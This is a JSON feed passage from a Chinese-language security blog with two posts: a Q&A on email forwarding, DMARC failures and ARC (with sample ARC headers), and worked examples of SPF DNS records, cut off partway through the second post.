{
  "version": "https://jsonfeed.org/version/1",
  "title": "Cymetrics Tech Blog",
  "home_page_url": "https://tech-blog.cymetrics.io",
  "feed_url": "https://tech-blog.cymetrics.io/feed/feed.json",
  "description": "Cymetrics Tech Blog",
  "author": {
    "name": "Cymetrics Tech Blog",
    "url": ""
  },
  "items": [{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra/",
      "title": "關於 email security 的大小事 — 延伸篇",
      "content_html": "<!-- summary -->\n<!-- 隨著前幾篇 email security 的介紹，我陸陸續續收到了一些問題，在交流的過程中覺得有一些很重要或是很有趣的討論可以更延伸探討。以下採取 Q&A 的格式，記錄一些討論與延伸知識。 -->\n<!-- summary -->\n<p>隨著前幾篇 email security 的介紹，我陸陸續續收到了一些問題，在交流的過程中覺得有一些很重要或是很有趣的討論可以更延伸探討。<br>\n不過因為原理篇跟設定篇希望可以聚焦在核心觀念上避免主題太發散，所以決定另外開一篇來聊聊這些東西。</p>\n<p>篇幅上會採取 Q&amp;A 的格式，記錄一些討論與延伸知識。若資訊有誤請不吝指正，也歡迎大家提問，讓這一串問答越來越齊全 XDDD</p>\n<p><a href=\"#q1\"><strong>Q1: SPF DKIM DMARC 這些看起來都是 2014 左右才出現的，滿好奇在這之前是怎麼驗證的，還是其實完全沒驗證？</strong></a></p>\n<p><a href=\"#q2\"><strong>Q2: Forwarding 上一篇提到很多次，是什麼意思？跟按信件上面那個箭頭轉發信件一樣嗎？</strong></a></p>\n<p><a href=\"#q3\"><strong>Q3: 『中繼 email server 』也提到很多次耶，他是哪些情況會出現？有可能是任意 domain （就是跟收件者跟寄件者本身都沒什麼關係）嗎？</strong></a></p>\n<p><a href=\"#q4\"><strong>Q4: <code>smtp.MailFrom</code> 跟 <code>header.From</code> 可以不同，然後 alignment 又不過，那 DMARC 不就失敗嗎？</strong></a></p>\n<p><a href=\"#q5\"><strong>Q5: 承上，那之前提到的 ARC 怎麼解這個問題？</strong></a></p>\n<p><a href=\"#q6\"><strong>Q6: 常常看到 SPF 用 <code>~all</code> 而不是 <code>-all</code>，有什麼差？</strong></a></p>\n<p>一樣附上前幾篇的連結，建議看不懂的名詞可以回去參照原理篇：<br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">關於 email security 的大小事 — 原理篇</a></p>\n<p>設定篇們：<br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">關於 email security 的大小事 — 設定篇 SPF</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">關於 email security 的大小事 — 設定篇 DKIM、DMARC</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">關於 email security 的大小事 — 範例篇</a></p>\n<hr>\n<h2 id=\"q1\"><a class=\"direct-link\" href=\"#q1\">#</a> Q1: SPF DKIM DMARC 這些看起來都是 2014 左右才出現的，滿好奇在這之前是怎麼驗證的，還是其實完全沒驗證？</h2>\n<p>SPF 與 DKIM 其實早在 2000 跟 2004 年左右就有在討論了，只是一直沒有訂出標準、更遑論普及，真正受到重視是在 2014 年左右，也是因為這樣才延伸出 DMARC 的。在此之前為了防範釣魚跟垃圾信件，往往都是用黑名單的方式，也就是把已經知道的某些惡意 IP 或是 mail server 列在一個黑名單裡面過濾掉。這跟現在過濾惡意 domain 的方法一樣，都是事後防範（reactive）。</p>\n<hr>\n<h2 id=\"q2\"><a class=\"direct-link\" href=\"#q2\">#</a> Q2: Forwarding 上一篇提到很多次，是什麼意思？跟按信件上面那個箭頭轉發信件一樣嗎？</h2>\n<p>是也不是。</p>\n<p>Forwarding 並不是在 RFC 裡定義明確的一個詞，而是我們用來泛指『轉發』這個動作的用語，負責 forwarding 的 mail server 就稱為 forwarding server 或是 <strong>mediator</strong>（中間人）。</p>\n<p>技術上我會把 forwarding 狹義定義為：在信封袋上（SMTP envelope）更改收信人（<code>smtp.RcptTo</code>）但保留寄件人（<code>smtp.MailFrom</code>）的行為。與 forwarding 相對，連信封袋上的寄件人（<code>smtp.MailFrom</code>）都改寫的行為，就稱為 remailing。舉例來說，假設你有個住在國外且準備回國的朋友，又有個很想買但不外送台灣的精品包包，forwarding 就像是請朋友幫你下訂然後順便帶回來，包裹上寫的還是精品公司的名字；remailing 則是朋友收到包包後用跨國快遞寄回來，包裹上寫的是朋友的名字。</p>\n<p>我們之前提過的 mailing list 就是一種 remailing，它的原理是由一個 mail server 維護一個負責接收信的 reflector 信箱跟訂閱者清單（subscribers），當你想要寄一封信給眾訂閱者時，可以用自己的信箱把信寄到 reflector，這樣就會觸發 mail server 把自己加到 <code>header.Reply-To</code> 跟 <code>smtp.MailFrom</code> ，再自動幫你把原信件轉發給所有訂閱者。有些 marketing email 會這麼做，或是你在一些學術討論串裡也會看到（其實就是 email 版本的聊天室）。這樣做的好處是可以自動化管理訂閱者清單、寄信人不用另外申請新的信箱、而且 mediator 可以視情況修改信件內容，例如在主旨加上標籤或是過濾文字。</p>\n<p>回到主題，根據<a href=\"https://en.wikipedia.org/wiki/Email_forwarding\">維基百科</a>，粗略可以將 forwarding 分成 Server-based forwarding 跟 Client-based forwarding。</p>\n<p>Client-based forwarding ，或稱 resending，又能分成自動和手動，自動的例子是有些會議軟體會允許受邀者修改時間或是會議內容等資訊，然後自動以主辦者的名義再次寄送或更新邀請給所有與會者，此時就會導致 <code>smtp.MailFrom</code> 跟 <code>header.From</code> 不相等。手動的部分就是一般人在 MUA 裡會用到的信件轉發，當我們手動按下轉發箭頭的時候，會把原信件 inline 嵌入到新信件裡，並完整保留附件以及 <code>header.From</code>、<code>header.Reply-To</code> 欄位。上述兩個例子中，其實寄件人（<code>smtp.MailFrom</code>）已經不是原本的寄件人了，所以比起 forwarding 這種行為更接近 remailing。</p>\n<p>那 Server-based forwarding 是什麼呢？許多 mail server 提供一個功能，讓你可以任意創建信箱地址，然後連到你自己本來擁有的信箱，方便信件集中處理。這種情況又被稱作 re-addressing 或 email aliasing，也就是信箱別名，是一種非常常見的應用。</p>\n<p>情境例如：為了讓客戶好辨認，你的公司（<code>candies.com</code>）為不同產品創建了多個客服信箱（<code>cookie@candies.com</code>、<code>chocolate@candies.com</code> 、<code>gummies@candies.com</code>），不過因為公司只有你一個客服，所以所有寄到這些信箱的信件其實都會被導到你的個人信箱，如 <code>jemmy88@gmail.com</code> 或是<code>jemmy01@outlook.com</code> 。 當然，要設定數個別名也行（你有新的客服夥伴一起處理信件啦），總之可以想成是創造一個統一對外的窗口，進來後再分發。早期的 sendmail 就是用一個檔案 <code>~/.forward</code> 來記錄這些一對多的 alias 關係再根據這些規則進行 forwarding。</p>\n<p>或者，你讀大學的時候本來有個學校信箱，畢業之後想繼續維持這個校友地址，但學校並不想負擔信件儲存的成本，這時就能用別名的方式讓信箱地址依然存在，不過信件所有寄到校友信箱的郵件就會被 forward 到你的其他私人信箱。</p>\n<p>不管哪個 aliasing 情境，信件本身（<code>header</code> 跟 <code>body</code>）跟信封袋上的寄件人（<code>smtp.MailFrom</code>）都是不變的。也就是說，收信人看到的內文都是原汁原味，點擊回覆的時候也是回給寄件人而不是中間 forwarding 的 mail server。雖然走過必留痕跡，forwarding 也會在原始信件中的 trace 被記錄下來，但就雙方 end user 溝通的角度而言，中間這層 forwarding 其實是隱形的。</p>\n<hr>\n<h2 id=\"q3\"><a class=\"direct-link\" href=\"#q3\">#</a> Q3:『中繼 email server 』也提到很多次耶，他是哪些情況會出現？有可能是任意 domain （就是跟收件者跟寄件者本身都沒什麼關係）嗎？</h2>\n<p>這個問題的詳細回答可以看看上面的 Q2，『中繼 email server 』是我敘述中比較通俗的用語，指的是寄信方跟最終收信方中間的 hop，在 RFC 定義中較為正式的名字是 <strong>mediator</strong>，也就是中間人。</p>\n<p>mediator 其實不能說是一台 server，而是『提供 reposting 的複合式角色』，它涵蓋了 MTA 的 relay 功能、MUA 的撰寫信件功能、以及 MDA 的地址查詢功能。mediator 也並非是固定的角色，例如一封信從 A 的 mail server 寄到 B 的 mail server，然後 B 再把信轉發到 C mail server，對 A 跟 B 而言這封信沒有經過任何 mediator，但對 C 而言 B 的 mail server 就扮演了 mediator 的角色。</p>\n<p>回到問題，mediator 可以是外部、第三方的服務，所以當然可能是跟收件者寄件者無關的 domain。</p>\n<hr>\n<h2 id=\"q4\"><a class=\"direct-link\" href=\"#q4\">#</a> Q4: <code>smtp.MailFrom</code> 跟 <code>header.From</code> 可以不同，然後 alignment 又不過，那 DMARC 不就失敗嗎？</h2>\n<p>是的！其實 DMARC 會失敗的情況非常多，甚至還出了一個 <a href=\"https://datatracker.ietf.org/doc/html/rfc7960\">RFC7960</a> （Interoperability Issues between Domain-based Message Authentication,<br>\n Reporting, and Conformance (DMARC) and Indirect Email Flows）討論呢！</p>\n<p>Indirect Email Flows 就是間接的寄信方式，包含前面 forwarding 提過的 alias 跟 mailing list，還有很多有趣的案例：</p>\n<ul>\n<li>當 MUA 嘗試以別人的身份寄信：有些新聞或是雜誌網站會有 “forward-to-friend” 功能，或是有些會有 “send-as” 功能。</li>\n<li>有些 IoT 或嵌入式設備會用 hardcoded domain 寄信，或是以 device owner 身份寄信</li>\n<li>有些 MTA 可能會修改信件內文的 encoding 或是 header 的欄位（例如日期格式），造成 DKIM 驗證錯誤</li>\n<li>MDA 也可能會在過濾時使用一些修改信件的功能，例如使用 <code>add_header()</code> 跟 <code>delete_header()</code> 等函式</li>\n</ul>\n<p>以上都是合理應用範圍但是 DMARC 不支援的情境，只要是有經過 mediator 轉達或是有修改到信件內容，要嘛驗證不過要嘛 alignment 不過，幾乎都會讓 DMARC 失敗。尤其大家如果都有好好設置成 <code>p=reject</code> 更是一點轉圜餘地都沒有了。</p>\n<hr>\n<h2 id=\"q5\"><a class=\"direct-link\" href=\"#q5\">#</a> Q5: 承上，那之前提到的 ARC 怎麼解這個問題？</h2>\n<p><strong>ARC（Authenticated Received Chain）</strong> 的宗旨就是為了解決 Indirect Email Flow 的問題，試圖加上更多驗證資訊讓本來準備丟掉 DMARC 失敗的信的 MDA 能重新考慮、通融一下。</p>\n<p>ARC 在 2019 年才成為 RFC 上的文件，仍屬實驗性質（experimental），因此目前有實作與支援的廠商也不多，在我較熟知的範圍裡只有最大的 Gmail 跟 Microsoft Office 365。</p>\n<h3 id=\"%E5%8E%9F%E7%90%86\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E7%90%86\">#</a> 原理</h3>\n<p>回想一下需要 ARC 的最大原因，就是因為經過 mediator 的過程中發生信件的修改更動或是來源不同，所以導致收信方認為自己拿到的『已經不是原本的信件』。但這樣多冤枉呀，信件經過 mediator 之前都是合法的，但最終是否能被收到卻只以收信方的 DMARC 驗證為主，這就像是你從台灣經過日本轉機到美國，美國海關卻打死認為你一定是日本人一樣荒謬啊！</p>\n<p>所以追根究底，只要能夠證明『經過 mediator 前的原始信件』跟『mediator 更動的部分』都是合法的，那就沒有疑慮了吧？</p>\n<p>因此 ARC 的運作方式，就是讓每一個 mediator 在經手信件時對信件做一次 DMARC 驗證，並將驗證結果、先前所有 hop 的 ARC 驗證結果、以及自己做的修改簽名，附在信封袋上作為擔保。每一個擔保的內容都接續著之前經過的 mediator 的擔保，因此會構成一條鏈（Authenticated Received <strong>Chain</strong>），假設鏈上的每個 mediator 都值得信任，那合理推論也可以相信他們所做的 DMARC 驗證結果吧！這樣當最後的終端收信 mail server 自己執行 DMARC 驗證失敗時，就可以透過 ARC 發現『啊，原來原始信件有通過 DMARC，只是中間經過了這些修改所以不一樣了呀』。</p>\n<p>這個『附在信封袋上的擔保』就是 <strong>ARC Set</strong>，是包含下面三個 ARC header 的一組紀錄。</p>\n<ul>\n<li>ARC-Authentication-Results (AAR)：『我做的 DMARC 跟 ARC 驗證』。紀錄此次 DMARC 驗證的結果以及先前每一組 ARC Set 驗證的結果。</li>\n<li>ARC-Message-Signature (AMS)：『我更動的部分並署名』。類似 DKIM Signature 的簽章，內容包含原始信件的各種 header 跟 DKIM Signature，還有新增或是更動的 header。</li>\n<li>ARC-Seal (AS)：『我核可信上所有的 ARC Set 並署名』。類似 DKIM Signature 的簽章，內容包含收到信件時已經紀錄的所有 ARC Set 以及剛剛新加的 AAR 跟 AMS。</li>\n</ul>\n<p>ARC-Seal 的意義是什麼呢？大家可能有經驗，如果去銀行或是公家單位辦事情，在填文件的時候寫錯了，有需要塗改的地方或是新增的備註，會請你在新的資料上蓋自己的印章以茲證明。ARC-Seal 的概念就是在層層印章印上再押上自己的名字，以示『我核可了過去的這一串簽名，當然還有我自己的部分』。</p>\n<h3 id=\"%E4%BE%86%E5%80%8B%E7%AF%84%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E4%BE%86%E5%80%8B%E7%AF%84%E4%BE%8B\">#</a> 來個範例</h3>\n<p>下面是一封原始信件的 ARC Set。所有的 header 都是用 stack 的方式紀錄，所以最先加的是紫色的 AAR ，再來是藍色的 AMS，最後是紅色的 AS。</p>\n<p><img src=\"/img/posts/crystal/email-sec-extra/arc-set.png\" alt=\"\"></p>\n<p>首先可以注意到的是，三個 header 中都由一樣的 <code>i</code> 標籤開始，這是一個類似 nonce、counter、或 ID 的數字，代表是第幾個經過的 mediator，從 1 開始累加。 所以假設我是收到上面這封信的 mediator，我要新增的 ARC Set 就都會標示 <code>i=2</code>。</p>\n<p>再來分別看看各個 header。紫色的 AAR 就是一般的 DMARC 驗證結果，可以看到最後是 <code>pass</code>。藍色的 AMS 幾乎跟 DKIM Signature 一樣，淡藍色的框是新增的 header，最末是原始信件的 DKIM Signature。紅色的 AS 也類似類似 DKIM Signature，但只簽 ARC Set 所以沒有 <code>h</code>、<code>bh</code> 等標籤。</p>\n<p>最重要的是 <code>cv</code> ，代表 <strong>C</strong>hain <strong>V</strong>alidation Status，也就是這條鏈的驗證結果。每一個 mediator 的 <code>cv</code>會根據前一個 mediator 紀錄的 <code>cv</code> 以及各個 ARC Set 的驗證結果決定。當一個 mediator 得出 fail 的結論，他就會停止演算法並標記 <code>cv=fail</code>，且加入的 AS 只會簽署當前新增的 ARC Set，等同打斷這條鏈並將發生錯誤的 ARC Set 視為唯一一組 ARC Set。此後的 mediator 一看到 <code>cv=fail</code> 就會停下不做任何驗證，也不會新增 ARC Set。</p>\n<p>因為圖中是第一個 mediator（<code>i=1</code>）所以 <code>cv=none</code>，畢竟鏈正要開始當然沒有東西可以做 Validation。 另外這裡沒有標示，但是後續的 AAR 會有一個 <code>arc=</code> 的標籤，會根據先前每個 ARC Set 中的 AMS 跟 AS 做驗證，確保鏈的完整性沒有被破壞。</p>\n<p>例如下圖（取自 RFC ）就是經過三個 mediator 的情況，只看螢光字的 <code>arc=</code>，你會發現 <code>i=2</code> 的 mediator 驗證了 <code>i=1</code> 的 AMS 跟 AS，然後 <code>i=3</code> 的 mediator 驗證了 <code>i=1,2</code> 的 AMS 跟 AS。</p>\n<p>你可能會疑問，為什麼在 <code>i=3</code> 的 mediator 那裡有一個 <code>fail</code> 還是得出 <code>arc=pass</code> 的結論呢？</p>\n<p>因為 <code>i=2</code> 的 mediator 對信件進行了修改，所以到 <code>i=3</code> 的 mediator 這裡時信件的 hash 已經不符合 <code>ams.1</code> 解密後的結果了。但是因為符合 <code>ams.2</code>，所以可以推論信件除了 <code>i=2</code> 的 mediator 之外沒有被其他人動過。既然前一個 <code>ams.2</code> 跟所有的 <code>as</code> 都過了，這條鏈是沒有問題的，給 <code>cv=pass</code>！</p>\n<pre class=\"language-text\"><code class=\"language-text\"><span class=\"highlight-line\">ARC-Seal: i=3; a=rsa-sha256; cv=pass; d=clochette.example.org; </span><br><span class=\"highlight-line\">    s=clochette; t=12345;b=CU87XzXlNlk5X/yW4l73UvPUcP9ivwYWxyBWc  </span><br><span class=\"highlight-line\">    VrRs7+HPx3K05nJhny2fvymbReAmOA9GTH/y+k9kEc59hAKVg==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=3; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    clochette.example.org; h=message-id:date:from:to:subject; s=  </span><br><span class=\"highlight-line\">    clochette; t=12345;bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZY  </span><br><span class=\"highlight-line\">    LQ=;b=o71vwyLsK+Wm4cOSlirXoRwzEvi0vqIjd/2/GkYFYlSd/GGfKzkAgPqx  </span><br><span class=\"highlight-line\">    fK7ccBMP7Zjb/mpeggswHjEMS8x5NQ==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=3; clochette.example.org; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=fail; </span><br><mark class=\"highlight-line highlight-line-active\">    arc=pass (as.2.gmail.example=pass,  </mark><br><mark class=\"highlight-line highlight-line-active\">    ams.2.gmail.example=pass, as.1.lists.example.org=pass,  </mark><br><mark class=\"highlight-line highlight-line-active\">    ams.1.lists.example.org=fail (message has been altered))  </mark><br><span class=\"highlight-line\">Authentication-Results: clochette.example.org; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=fail; </span><br><span class=\"highlight-line\">    arc=pass (as.2.gmail.example=pass,  </span><br><span class=\"highlight-line\">    ams.2.gmail.example=pass, as.1.lists.example.org=pass,  </span><br><span class=\"highlight-line\">    ams.1.lists.example.org=fail (message has been altered))  </span><br><span class=\"highlight-line\">ARC-Seal: i=2; a=rsa-sha256; cv=pass; d=gmail.example; s=20120806;  </span><br><span class=\"highlight-line\">    t=12345; b=Zpukh/kJL4Q7Kv391FKwTepgS56dgHIcdhhJZjsalhqkFIQ  </span><br><span class=\"highlight-line\">    QAJ4T9BE8jjLXWpRNuh81yqnT1/jHn086RwezGw==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    gmail.example; h=message-id:date:from:to:subject;s=20120806;   </span><br><span class=\"highlight-line\">    t=12345; bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZYLQ=;  </span><br><span class=\"highlight-line\">    b=CVoG44cVZvoSs2mMig2wwqPaJ4OZS5XGMCegWqQs1wvRZJS894tJM0xO1  </span><br><span class=\"highlight-line\">    RJLgCPsBOxdA59WSqI9s9DfyKDfWg==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=2; gmail.example; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@example.org; dmarc=fail; </span><br><mark class=\"highlight-line highlight-line-active\">    arc=pass (as.1.lists.example.org=pass, ams.1.lists.example.org=pass)  </mark><br><span class=\"highlight-line\">ARC-Seal: i=1; a=rsa-sha256; cv=none; d=lists.example.org; s=dk-   </span><br><span class=\"highlight-line\">    lists; t=12345; b=TlCCKzgk3TrAa+G77gYYO8Fxk4q/Ml0biqduZJeOYh6+  </span><br><span class=\"highlight-line\">    0zhwQ8u/lHxLi21pxu347isLSuNtvIagIvAQna9a5A==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    lists.example.org; h=message-id:date:from:to:subject; s=dk-    </span><br><span class=\"highlight-line\">    lists; t=12345; bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZYL  </span><br><span class=\"highlight-line\">    Q=; b=DsoD3n3hiwlrN1ma8IZQFgZx8EDO7Wah3hUjIEsYKuShRKYB4LwGUiKD5Y  </span><br><span class=\"highlight-line\">    yHgcIwGHhSc/4+ewYqHMWDnuFxiQ==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=1; lists.example.org; spf=pass  </span><br><span class=\"highlight-line\">    smtp.mfrom=jqd@d1.example; dkim=pass (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=pass</span></code></pre>\n<h3 id=\"%E5%B0%8F%E7%B5%90\"><a class=\"direct-link\" href=\"#%E5%B0%8F%E7%B5%90\">#</a> 小結</h3>\n<p>雖然 ARC 用數位簽章的方式做擔保，看似解決了 Indirect Mail Flow 的問題，但他並不是萬靈丹。畢竟 ARC 只是提供更多資訊讓最終收信端可以看到中間『隱形的部分』，並不能保證每一個經過的 mediator 都是值得信任的。</p>\n<p>再者，對 mail server 而言 ARC 只是參考指標（MAY … consult … ARC），無論結果如何，mail server 都可以只採用本身 DMARC 驗證的結果決定信件去留，並不一定要採納 ARC。</p>\n<p>關於 ARC 的許多細節都還有待討論，未來也許會加入其他規範讓這個機制更加完整，更多資訊可以參考 <a href=\"http://arc-spec.org\">ARC-spec</a> 跟 <a href=\"https://datatracker.ietf.org/doc/html/rfc8617\">RFC8617</a>。</p>\n<hr>\n<h2 id=\"q6\"><a class=\"direct-link\" href=\"#q6\">#</a> Q6: 常常看到 SPF 用 <code>~all</code> 而不是 <code>-all</code>，有什麼差？</h2>\n<p>前面在 SPF 設定篇提過有四種 qualifier，這邊貼過來一遍：</p>\n<ul>\n<li><code>pass(+)</code>：若對到 sender-ip，結果 pass（即白名單）。預設值，可以省略（ <code>+all</code> 同 <code>all</code>）</li>\n<li><code>neutral(?)</code>：None ，等同沒有 policy。</li>\n<li><code>softfail(~)</code>：若對到 sender-ip，結果 fail，仍要標注並接受。</li>\n<li><code>fail(-)</code>：若對到 sender-ip，結果 fail（即黑名單）。</li>\n</ul>\n<p>其中，對 <code>all</code> 機制而言最常出現的是 <code>softfail(~all)</code> 跟 <code>fail(-all)</code>。單以 SPF 來說，這兩個的區別明顯就是指示收信的 mail server『雖然我們都是 fail，但請保留 softfail 的』。不過在有設定跟使用 DMARC 的情況下，最後 MDA 只會根據 DMARC 判定的 policy 來決定採取的行為，因為 <code>softfail</code> 跟 <code>fail</code> 都對 DMARC 給出了 fail 的結果，所以他們其實是等價的。只有在單獨使用 SPF 驗證的時候，<code>softfail</code> 跟 <code>fail</code> 的差別才會造成影響。</p>\n<hr>\n<h2 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h2>\n<ol>\n<li><a href=\"https://en.wikipedia.org/wiki/Email_forwarding\">Email Forwarding — Wikipedia</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7960#section-2\">RFC7960</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc5598#section-5\">RFC5598</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8617\">RFC8617</a></li>\n</ol>\n",
      "date_published": "2021-07-23T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples/",
      "title": "關於 email security 的大小事 — 範例篇",
      "content_html": "<!-- summary -->\n<p>有鑒於大家了解了 SPF、DKIM、DMARC 設置上的原理與地雷後，對於如何設置可能還是霧颯颯，因此決定再推出範例篇讓大家看一些實際的紀錄以及設置方式。希望可以讓大家輕鬆做好 email security！</p>\n<!-- summary -->\n<p>以下有不懂的標籤可以參照設定篇：<br>\nSPF 的設定 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">關於 email security 的大小事 — 設定篇 SPF</a><br>\nDKIM、DMARC 的設定 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">關於 email security 的大小事 — 設定篇 DKIM、DMARC</a></p>\n<p>以下主要以 <a href=\"https://mxtoolbox.com/SuperTool.aspx?run=toolpage\">mxtoolbox</a> 作為紀錄查詢工具。</p>\n<hr>\n<h2 id=\"spf\"><a class=\"direct-link\" href=\"#spf\">#</a> SPF</h2>\n<p>在設定 SPF 時最重要的就是知道『有哪些寄信的網域』。我們用幾種情境舉例：</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%8F%AA%E6%9C%89%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%8F%AA%E6%9C%89%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F\">#</a> 情境一：只有自家網域</h3>\n<p>首先，你需要知道自己有哪些 mail server 。</p>\n<p>這時你有下面幾種選項：</p>\n<p><strong>mail server 與寄信 domain 相同(IP 同)</strong>，允許 IP 就是此 domain 的 IP：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 a -all</code></pre>\n<p><strong>mail server 與寄信 domain 相同(IP 不同)</strong>，允許 IP 就是 mail server 的 IP：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx -all</code></pre>\n<p><strong>mail server 與寄信 domain 不同，或是有多台 mail server</strong>，需一一列出：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx:mail-server-1 mx:mail-server-2 mx:mail-server-3 -all</code></pre>\n<p><strong>已經有別的寄信 domain 設置好 SPF</strong> ，例如 google 自己是 email provider 又同時提供 email hosting，以下為 <a href=\"http://gmail.com\">gmail.com</a> 的 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 redirect=_spf.google.com</code></pre>\n<p>建議如果想省下 DNS query 的扣打，可以考慮 <strong>展開成 <code>ip4</code> <code>ip6</code> 機制</strong>，例如以下為 MailChimp（<a href=\"http://servers.mcsv.net\">servers.mcsv.net</a>）的 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 ip4:205.201.128.0/20 ip4:198.2.128.0/18 ip4:148.105.8.0/21 -all</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9B%B2%E7%AB%AF%E6%88%96%E6%98%AF%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9B%B2%E7%AB%AF%E6%88%96%E6%98%AF%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\">#</a> 情境二：使用雲端或是第三方網域</h3>\n<p>當你使用第三方網域寄信，就必須把他們的 mail server 也放到自己的 SPF 紀錄中，一般而言他們都已經有設好 SPF 紀錄了，所以你只要用 <code>include</code> 機制就可以涵蓋。請去查詢他們設置 SPF 的 domain 然後加到紀錄中：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:third-1 include:third-2 include:third-3 -all</code></pre>\n<p><em>***文末附上最近整理的常見第三方 SPF domain***</em></p>\n<p>以 OneDegree 為例，我們使用的 hosting provider 為 Microsoft Office365，第三方服務為： SendGrid、MailChimp、FreshDesk。去網站上查一下或是在服務的 portal 裡應該就能輕鬆找到設置 SPF 的 domain，例如下圖是 MailChimp 的文件：</p>\n<p><img src=\"/img/posts/crystal/email-sec-examples/mailchimp.png\" alt=\"\"></p>\n<p>資料收集完成，就能初步建構出我們的 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:spf.protection.outlook.com include:sendgrid.net include:servers.mcsv.net include:email.freshdesk.com -all</code></pre>\n<p>再來就是優化的部分，你可以去 <a href=\"https://mxtoolbox.com/SuperTool.aspx?run=toolpage\">mxtoolbox</a> 逐一查詢以上 include 的這些紀錄，會發現 <a href=\"http://email.freshdesk.com\">email.freshdesk.com</a> 已經包含了 <a href=\"http://sendgrid.net\">sendgrid.net</a> ，也就是說其實我們自己的紀錄中已經重複 include 了，造成一次多餘的 DNS query。</p>\n<p><img src=\"/img/posts/crystal/email-sec-examples/mxtoolbox.png\" alt=\"\"></p>\n<p>排除重複的部分，我們就能得到最終的 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%90%8C%E6%99%82%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F%E8%B7%9F%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%90%8C%E6%99%82%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F%E8%B7%9F%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\">#</a> 情境三：同時使用自家網域跟第三方網域</h3>\n<p>這應該是最常見的情況了。只要結合上面的兩個情境就行，一般來說會把自家的 <code>a</code> <code>mx</code> 放前面，<code>include</code> 的放後面，不過這也沒有規定，純粹閱讀方便就是了。</p>\n<p>要特別注意的是，如果你有用到 <code>redirect</code> 記得要放最後，因為 <code>redirect</code> 是一種 modifier，也就是前面的 mechanism 都沒有 match 才會執行，相對的，跳到 <code>redirect</code> 的 SPF 紀錄之後，就會以那筆 SPF 紀錄為主，本來在 <code>redirect</code> 後面的東西都會被忽略。所以如果要用就要長這樣：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx include:spf.protection.outlook.com include:sendgrid.net redirect:_spf.PROVIDERSERVER.COM</code></pre>\n<h3 